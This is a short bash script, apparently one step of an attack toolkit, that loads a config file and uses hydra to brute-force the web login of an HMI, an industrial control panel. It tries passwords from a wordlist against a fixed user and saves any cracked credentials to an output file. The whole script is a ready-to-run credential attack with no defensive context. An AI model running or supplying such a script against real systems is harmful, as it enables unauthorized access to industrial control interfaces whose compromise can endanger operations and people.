#!/bin/bash
. config

echo "${red}Bruteforce the creds...${reset}"
hydra -l $EXPLOIT_USER -s $EXPLOIT_PORT -P $WFZ_WORDLIST $HMI_IP http-post-form "/$CD_PATH/login.htm:username=^USER^&password=^PASS^:Invalid login, please try again" -o ${PWN_PATH}/hydra-results.txt
